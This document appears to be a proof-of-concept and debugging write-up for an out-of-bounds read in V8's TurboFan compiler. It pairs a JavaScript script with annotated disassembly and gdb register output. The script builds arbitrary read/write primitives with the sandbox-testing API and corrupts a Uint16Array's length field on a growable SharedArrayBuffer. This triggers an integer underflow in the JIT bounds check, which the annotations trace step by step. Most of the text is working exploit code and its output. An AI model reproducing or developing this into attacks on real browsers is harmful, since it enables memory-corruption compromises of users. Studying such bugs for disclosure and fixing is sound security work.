

```js

let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
    return Sandbox.getAddressOf(obj);
  }
  
  function v8_read64(addr) {
    return sandboxMemory.getBigUint64(Number(addr), true);
  }
  
  function v8_write64(addr, val) {
    return sandboxMemory.setBigInt64(Number(addr), val, true);
  }



const gsab = new SharedArrayBuffer(0x16,{"maxByteLength":0x4242});
const u16arr = new Uint16Array(gsab,0x10);
// u16arr[1] = 1;
// console.log(u16arr[1]);

function foo(obj,index, val) {
    obj[index] += val;
    return obj[index];

}

function test(iii,val) {
    return foo(u16arr, iii, val);
}

for (var i = 0; i < 0x10000; ++i) {
    test(1,0);
}
// %DebugPrint(gsab);
%DebugPrint(u16arr);
console.log(addrOf(u16arr));
console.log(v8_read64(addrOf(u16arr)+0x17));

v8_write64(addrOf(u16arr)+0x19,0x2e00000n);

%DebugPrint(u16arr);
let target = Number(0x20000000000n);
%DebugPrint(target);

%SystemBreak();

var ret = test(target,0);
console.log(ret);



```


```js

gdb$ r --expose-gc --allow-natives-syntax --sandbox-testing --trace-turbo --print-code  pocs/oobr.js
...
--- Optimized code ---
optimization_id = 1
source_position = 594
kind = TURBOFAN
name = test
stack_slots = 13
compiler = turbofan
address = 0x240000040dd5
0x7fff60000600     0  488d1df9ffffff       REX.W leaq rbx,[rip+0xfffffff9]
0x7fff60000607     7  483bd9               REX.W cmpq rbx,rcx
0x7fff6000060a     a  740d                 jz 0x7fff60000619  <+0x19>
0x7fff6000060c     c  ba86000000           movl rdx,0x86
0x7fff60000611    11  41ff9598540000       call [r13+0x5498]
0x7fff60000618    18  cc                   int3l
0x7fff60000619    19  8b59f4               movl rbx,[rcx-0xc]
0x7fff6000061c    1c  490b9de8010000       REX.W orq rbx,[r13+0x1e8]
0x7fff60000623    23  f6431a20             testb [rbx+0x1a],0x20
0x7fff60000627    27  0f85131e3d1f         jnz 0x7fff7f3d2440  (CompileLazyDeoptimizedCode)    ;; near builtin entry
0x7fff6000062d    2d  55                   push rbp
0x7fff6000062e    2e  4889e5               REX.W movq rbp,rsp
0x7fff60000631    31  56                   push rsi
0x7fff60000632    32  57                   push rdi
0x7fff60000633    33  50                   push rax
0x7fff60000634    34  4883ec40             REX.W subq rsp,0x40
0x7fff60000638    38  488975c8             REX.W movq [rbp-0x38],rsi
0x7fff6000063c    3c  493b65a0             REX.W cmpq rsp,[r13-0x60] (external value (StackGuard::address_of_jslimit()))
0x7fff60000640    40  0f8665040000         jna 0x7fff60000aab  <+0x4ab>
0x7fff60000646    46  48badd2d0500a0240000 REX.W movq rdx,0x24a000052ddd    ;; object: 0x24a000052ddd <Uint16Array map = 0x24a00028ccc1>
0x7fff60000650    50  8b4a13               movl rcx,[rdx+0x13]
0x7fff60000653    53  41baffffffff         movl r10,0xffffffff
0x7fff60000659    59  493bca               REX.W cmpq rcx,r10
0x7fff6000065c    5c  760d                 jna 0x7fff6000066b  <+0x6b> JUMP
0x7fff6000065e    5e  ba02000000           movl rdx,0x2
0x7fff60000663    63  41ff9598540000       call [r13+0x5498]
0x7fff6000066a    6a  cc                   int3l
0x7fff6000066b    6b  8b7a0f               movl rdi,[rdx+0xf]
0x7fff6000066e    6e  4903fe               REX.W addq rdi,r14
0x7fff60000671    71  448bc1               movl r8,rcx
0x7fff60000674    74  4183e002             andl r8,0x2
0x7fff60000678    78  48894db8             REX.W movq [rbp-0x48],rcx
0x7fff6000067c    7c  48897dc0             REX.W movq [rbp-0x40],rdi
0x7fff60000680    80  f6c101               testb rcx,0x1
0x7fff60000683    83  0f8553000000         jnz 0x7fff600006dc  <+0xdc> JUMP
0x7fff60000689    89  4585c0               testl r8,r8
0x7fff6000068c    8c  0f850d000000         jnz 0x7fff6000069f  <+0x9f>
0x7fff60000692    92  4c8b4227             REX.W movq r8,[rdx+0x27]
0x7fff60000696    96  49c1e81d             REX.W shrq r8, 29
0x7fff6000069a    9a  e935000000           jmp 0x7fff600006d4  <+0xd4>
0x7fff6000069f    9f  4c8b421f             REX.W movq r8,[rdx+0x1f]
0x7fff600006a3    a3  49c1e81d             REX.W shrq r8, 29
0x7fff600006a7    a7  4c8b4f13             REX.W movq r9,[rdi+0x13]
0x7fff600006ab    ab  49c1e91d             REX.W shrq r9, 29
0x7fff600006af    af  4c8b5a17             REX.W movq r11,[rdx+0x17]
0x7fff600006b3    b3  49c1eb1d             REX.W shrq r11, 29
0x7fff600006b7    b7  4d03d8               REX.W addq r11,r8
0x7fff600006ba    ba  4d3bd9               REX.W cmpq r11,r9
0x7fff600006bd    bd  0f8608000000         jna 0x7fff600006cb  <+0xcb>
0x7fff600006c3    c3  4533c9               xorl r9,r9
0x7fff600006c6    c6  e903000000           jmp 0x7fff600006ce  <+0xce>
0x7fff600006cb    cb  4d8bc8               REX.W movq r9,r8
0x7fff600006ce    ce  49d1e9               REX.W shrq r9, 1
0x7fff600006d1    d1  4d8bc1               REX.W movq r8,r9
0x7fff600006d4    d4  4533c9               xorl r9,r9
0x7fff600006d7    d7  e987000000           jmp 0x7fff60000763  <+0x163>
0x7fff600006dc    dc  f6c102               testb rcx,0x2
0x7fff600006df    df  0f8559000000         jnz 0x7fff6000073e  <+0x13e> NOT JUMP
0x7fff600006e5    e5  57                   push rdi
0x7fff600006e6    e6  48be55d62900a0240000 REX.W movq rsi,0x24a00029d655    ;; object: 0x24a00029d655 <ScriptContext[7]>
0x7fff600006f0    f0  48bbe04757f6ff7f0000 REX.W movq rbx,0x7ffff65747e0    ;; external reference (Runtime::GrowableSharedArrayBufferByteLength)
0x7fff600006fa    fa  b801000000           movl rax,0x1
0x7fff600006ff    ff  e8fcff791f           call 0x7fff7f7a0700  (CEntry_Return1_ArgvOnStack_NoBuiltinExit)    ;; near builtin entry
             -> Runtime Get byte_length :? RAX: 0x000000000000002C
              #1  v8::internal::Runtime_GrowableSharedArrayBufferByteLength (args_length=0x1, args_object=0x7fffffffd428, isolate=0x5555555e2000) at ../../src/runtime/runtime-typedarray.cc:67
              RUNTIME_FUNCTION(Runtime_GrowableSharedArrayBufferByteLength) {
                    HandleScope scope(isolate);
                    DCHECK_EQ(1, args.length());
                    Handle<JSArrayBuffer> array_buffer = args.at<JSArrayBuffer>(0);

                    CHECK_EQ(0, array_buffer->byte_length());
                    size_t byte_length = array_buffer->GetBackingStore()->byte_length();
                    return *isolate->factory()->NewNumberFromSize(byte_length);
                }

0x7fff60000704   104  a801                 test al,0x1
0x7fff60000706   106  0f85c8030000         jnz 0x7fff60000ad4  <+0x4d4> NOT JUMP
0x7fff6000070c   10c  d1f8                 sarl rax, 1 <------------ RAX: 0x000000000000002C
0x7fff6000070e   10e  c5832ac0             vcvtlsi2sd xmm0,xmm15,rax <-------- RAX: 0x0000000000000016
0x7fff60000712   112  48badd2d0500a0240000 REX.W movq rdx,0x24a000052ddd    ;; object: 0x24a000052ddd <Uint16Array map = 0x24a00028ccc1>
0x7fff6000071c   11c  488b4a17             REX.W movq rcx,[rdx+0x17] <------------------ RCX: 0x00000002E0000000 OUR VALUE (v8_write64(addrOf(u16arr)+0x19,0x2e00000n);)
0x7fff60000720   120  48c1e91d             REX.W shrq rcx, 29 <--------RCX: 0x0000000000000017
0x7fff60000724   124  c4e1fb2cf8           vcvttsd2siq rdi,xmm0 <------------- RDI: 0x0000000000000016
0x7fff60000729   129  482bf9               REX.W subq rdi,rcx <-------------- SUB UNDERFLOW
0x7fff6000072c   12c  48d1ef               REX.W shrq rdi, 1
0x7fff6000072f   12f  4c8bc7               REX.W movq r8,rdi 
0x7fff60000732   132  488b7dc0             REX.W movq rdi,[rbp-0x40]
0x7fff60000736   136  8b4db8               movl rcx,[rbp-0x48]
0x7fff60000739   139  e91f000000           jmp 0x7fff6000075d  <+0x15d>
 13e  REX.W movq r8,[rdi+0x13]
   142  REX.W shrq r8, 29
   146  REX.W movq r9,[rdx+0x17]
   14a  REX.W shrq r9, 29
   14e  REX.W cmpq r9,r8
   151  ja 0x774ae0000ade  B17 <+0x4de>
B18:
   157  REX.W subq r8,r9 ~~~~~~~ WROND!!! we controlled both r8 and r9 and this will be underflow  -> r8 very large
   15a  REX.W shrq r8, 1
B19,20:
   0x7fff6000075d 15d  movl r9,0x1
B21:
   163  movl r11,[rdx+0x37]
   167  movl r10,0xffffffff
   16d  REX.W cmpq r11,r10
   170  jna 0x774ae000077f  <+0x17f>  ---- JUMP
   172  movl rdx,0x2
   177  call [r13+0x54c8]
   17e  int3l
   17f  REX.W movq r12,[rdx+0x2f]
   183  REX.W shrq r12, 24
   187  REX.W addq r12,r14
   18a  REX.W movq [rbp-0x30],r11
   18e  REX.W movq r15,[rbp+0x18]
   192  REX.W movq [rbp-0x28],r12
   196  testb r15,0x1
   19a  jnz 0x774ae0000ae6  B23 <+0x4e6>
B22:
   1a0  REX.W movq rax,r15
   1a3  sarl rax, 1
   1a5  REX.W movsxlq rax,rax
B24:
   1a8  REX.W cmpq rax,r8 ~~~~~~~~ we controlled rax and r8 is very large here lead to oob!
   1ab  jnc 0x774ae0000b56  <+0x556>
   1b1  movl r8,r11
   1b4  movl r10,0xffffffff
   1ba  REX.W cmpq r8,r10
   1bd  jna 0x774ae00007cc  <+0x1cc>
   1bf  movl rdx,0x2
   1c4  call [r13+0x54c8]
   1cb  int3l
   1cc  REX.W addq r8,r12
   1cf  movzxwl r8,[r8+rax*2] 
   -----------------------------------------------------------------------------------------------------------------------[e[1m][regs]
  RAX: 0x0000020000000000  RBX: 0x00007FFFF65747E0  RBP: 0x00007FFFFFFFD488  RSP: 0x00007FFFFFFFD430  [e[1m][e[0;31m]o d I t s z a p c
  RDI: 0x00000D6400052D99  RSI: 0x00000D640029D655  RDX: 0x00000D6400052DDD  RCX: 0x0000000000000069  RIP:[e[0;31m] 0x00007FFF600007CF
  R8 : 0x00000D6700000010  R9 : 0x0000000000000001  R10: 0x00000000FFFFFFFF  R11: 0x0000000000000000  R12: 0x00000D6700000010
  R13: 0x00005555555E2080  R14: 0x00000D6400000000  R15: 0x00000D6400052F11
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B
-----------------------------------------------------------------------------------------------------------------------[e[1m][code]
=> 0x7fff600007cf:	movzx  r8d,WORD PTR [r8+rax*2]
   0x7fff600007d4:	mov    r10d,0xffffffff
   0x7fff600007da:	cmp    r8,r10
   0x7fff600007dd:	jbe    0x7fff600007ec
   0x7fff600007df:	mov    edx,0x2
   0x7fff600007e4:	call   QWORD PTR [r13+0x5498]
   0x7fff600007eb:	int3
   0x7fff600007ec:	mov    rbx,QWORD PTR [rbp+0x20]

```
